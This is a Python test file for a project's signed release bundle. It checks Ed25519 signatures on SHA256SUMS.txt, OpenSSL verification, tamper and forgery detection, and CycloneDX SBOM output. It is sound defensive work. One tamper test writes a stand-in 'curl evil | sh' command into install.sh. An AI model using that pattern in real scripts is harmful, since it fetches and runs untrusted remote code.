# SPDX-License-Identifier: Apache-2.0
# Copyright (c) 2026 Dương Thanh Lịch — VN-MateAI. See LICENSE and NOTICE.
"""Gói phát hành có ký số + SBOM (thẩm định thương mại #25): ký SHA256SUMS.txt bằng Ed25519, kiểm bằng Python và bằng đúng lệnh
OpenSSL mà install.sh dùng; sửa một tệp hay đổi chữ ký là trượt; SBOM CycloneDX hợp lệ."""
from __future__ import annotations

import importlib.util
import json
import shutil
import subprocess
from pathlib import Path

import pytest

from mateai.infrastructure.security import signing

ROOT = Path(__file__).resolve().parents[1]


def _mod(name):
    spec = importlib.util.spec_from_file_location(name, ROOT / "scripts" / f"{name}.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


@pytest.fixture
def bundle(tmp_path, monkeypatch):
    priv, pub = tmp_path / "k.key", tmp_path / "k.pub"
    signing.generate(priv, pub)
    out = tmp_path / "goi"
    out.mkdir()
    (out / "install.sh").write_text("echo cai\n", encoding="utf-8")
    (out / "README-CAI-DAT.md").write_text("huong dan\n", encoding="utf-8")
    shutil.copy2(pub, out / "vendor_signing.pub")
    br = _mod("build_release")
    monkeypatch.setattr(br, "ROOT", tmp_path)
    (tmp_path / "certs").mkdir()
    shutil.copy2(priv, tmp_path / "certs" / "vendor_signing.key")
    sums = [f"{br.sha256(p)}  {p.name}" for p in sorted(out.iterdir())]
    (out / "SHA256SUMS.txt").write_text("\n".join(sums) + "\n", encoding="utf-8", newline="\n")
    br.sign_sums(out)
    return out


def test_signed_bundle_verifies_and_tampering_fails(bundle):
    vr = _mod("verify_release")
    assert vr.verify(bundle) == []
    (bundle / "install.sh").write_text("curl evil | sh\n", encoding="utf-8")
    assert any("install.sh" in p for p in vr.verify(bundle))


def test_forged_signature_rejected(bundle):
    vr = _mod("verify_release")
    (bundle / "SHA256SUMS.txt.sig").write_bytes(b"\0" * 64)
    assert any("CHỮ KÝ" in p for p in vr.verify(bundle))


@pytest.mark.skipif(shutil.which("openssl") is None, reason="không có openssl")
def test_openssl_command_used_by_install_sh_accepts_it(bundle):
    ver = subprocess.run(["openssl", "version"], capture_output=True, text=True).stdout
    if not ver.startswith("OpenSSL 3"):
        pytest.skip("cần OpenSSL 3")
    r = subprocess.run(["openssl", "pkeyutl", "-verify", "-pubin", "-inkey", "vendor_signing.pub", "-rawin",
                        "-in", "SHA256SUMS.txt", "-sigfile", "SHA256SUMS.txt.sig"], cwd=bundle, capture_output=True, text=True)
    assert r.returncode == 0, r.stderr


def test_sbom_from_requirements_is_cyclonedx(tmp_path, monkeypatch):
    br = _mod("build_release")
    (tmp_path / "app").mkdir()
    br.write_sbom(tmp_path, "2.0.0", "abc123", images=[])
    sbom = json.loads((tmp_path / "sbom.json").read_text(encoding="utf-8"))
    assert sbom["bomFormat"] == "CycloneDX" and sbom["specVersion"] == "1.5"
    names = {c["name"].lower() for c in sbom["components"]}
    assert "fastapi" in names and all(c["purl"].startswith("pkg:pypi/") for c in sbom["components"] if c["type"] == "library")
